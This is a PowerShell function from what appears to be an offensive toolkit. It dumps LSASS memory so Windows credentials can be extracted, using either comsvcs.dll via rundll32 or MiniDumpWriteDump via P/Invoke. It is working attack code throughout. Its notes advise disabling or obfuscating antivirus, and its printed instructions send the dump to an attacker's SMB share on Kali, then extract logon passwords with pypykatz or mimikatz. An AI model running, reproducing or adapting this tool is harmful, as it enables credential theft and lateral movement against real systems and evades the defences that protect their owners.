function Invoke-SeDebugAbuse {
<#
.SYNOPSIS
    Abuses SeDebugPrivilege to dump LSASS memory to a minidump file for offline
    credential extraction.

.DESCRIPTION
    SeDebugPrivilege grants full access to any process, including LSASS.
    This script uses MiniDumpWriteDump via P/Invoke to write a minidump of LSASS.

    After dumping, extract credentials offline:
      pypykatz lsa minidump lsass.dmp
      mimikatz: sekurlsa::minidump lsass.dmp ; sekurlsa::logonpasswords

    Dump file should be exfilled to Kali before analysis.

.EXAMPLE
    Invoke-SeDebugAbuse
    # Dumps to C:\tmp\lsass.dmp

.EXAMPLE
    Invoke-SeDebugAbuse -OutFile C:\Windows\Temp\debug.bin

.NOTES
    vajra / hacktrack toolkit
    Credits: @mattifestation, various
    AV NOTE: This will likely trigger Defender. Obfuscate or disable AV first.
             Consider using comsvcs.dll method as an alternative (see below).
#>
    param(
        [Parameter(Mandatory=$false)]
        [string]$OutFile = "C:\tmp\lsass.dmp"
    )

    # ── Verify privilege ─────────────────────────────────────────────────────────
    $privs = (whoami /priv) -join " "
    if ($privs -notmatch "SeDebugPrivilege") {
        Write-Output "[-] SeDebugPrivilege not found in current token."
        return
    }
    Write-Output "[+] SeDebugPrivilege detected"

    # ── Ensure output dir exists ─────────────────────────────────────────────────
    $outDir = Split-Path $OutFile -Parent
    if (!(Test-Path $outDir)) {
        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
    }

    # ── Method A: comsvcs.dll MiniDump (preferred — native, stealthier) ──────────
    Write-Output "[*] Attempting comsvcs.dll MiniDump method..."
    $lsassPid = (Get-Process lsass).Id
    Write-Output "[*] LSASS PID: $lsassPid"
    Write-Output "[*] Output: $OutFile"

    try {
        # This uses the built-in comsvcs.dll which has MiniDump export
        # Runs via rundll32 in a separate process — less obvious than direct API call
        & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump "$lsassPid $OutFile full"
        Start-Sleep -Seconds 3

        if (Test-Path $OutFile) {
            $size = (Get-Item $OutFile).Length
            Write-Output "[+] Dump written: $OutFile ($([math]::Round($size/1MB, 1)) MB)"
        } else {
            Write-Output "[!] comsvcs method didn't write the file. Trying P/Invoke method..."
            throw "file not created"
        }
    } catch {
        # ── Method B: MiniDumpWriteDump via P/Invoke ──────────────────────────────
        Write-Output "[*] Falling back to MiniDumpWriteDump P/Invoke method..."

        $typeName = "DbgHelp_$(Get-Random)"
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class $typeName {
    [DllImport("dbghelp.dll", SetLastError=true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess, uint ProcessId, IntPtr hFile,
        uint DumpType, IntPtr ExceptionParam,
        IntPtr UserStreamParam, IntPtr CallbackParam);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

        $PROCESS_ALL_ACCESS = 0x001FFFFF
        $MiniDumpWithFullMemory = 2

        try {
            $lsassPid   = (Get-Process lsass).Id
            $hProcess   = Invoke-Expression "[$typeName]::OpenProcess($PROCESS_ALL_ACCESS, `$false, $lsassPid)"

            if ($hProcess -eq [IntPtr]::Zero) {
                Write-Output "[-] Failed to open LSASS handle. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
                return
            }

            $fs = New-Object System.IO.FileStream($OutFile, [System.IO.FileMode]::Create)
            $result = Invoke-Expression "[$typeName]::MiniDumpWriteDump(`$hProcess, $lsassPid, `$fs.SafeFileHandle.DangerousGetHandle(), $MiniDumpWithFullMemory, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)"
            $fs.Close()

            Invoke-Expression "[$typeName]::CloseHandle(`$hProcess)" | Out-Null

            if ($result) {
                $size = (Get-Item $OutFile).Length
                Write-Output "[+] LSASS dump written: $OutFile ($([math]::Round($size/1MB, 1)) MB)"
            } else {
                Write-Output "[-] MiniDumpWriteDump failed. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            }
        } catch {
            Write-Output "[-] P/Invoke method failed: $_"
        }
    }

    # ── Post-dump instructions ───────────────────────────────────────────────────
    if (Test-Path $OutFile) {
        Write-Output ""
        Write-Output "[*] Transfer dump to Kali, then extract creds:"
        Write-Output ""
        Write-Output "    # Option A - pypykatz (pure Python, no wine needed):"
        Write-Output "    pypykatz lsa minidump $OutFile"
        Write-Output ""
        Write-Output "    # Option B - mimikatz:"
        Write-Output "    mimikatz # sekurlsa::minidump $OutFile"
        Write-Output "    mimikatz # sekurlsa::logonpasswords"
        Write-Output ""
        Write-Output "    # Transfer from target:"
        Write-Output "    # On Kali: impacket-smbserver share \$(pwd) -smb2support"
        Write-Output "    # On target: copy $OutFile \\\\LHOST\\share\\lsass.dmp"
        Write-Output ""
        Write-Output "[!] AV NOTE: The dump file itself may be flagged on exfil."
        Write-Output "    Compress or split it if needed."
    }
}
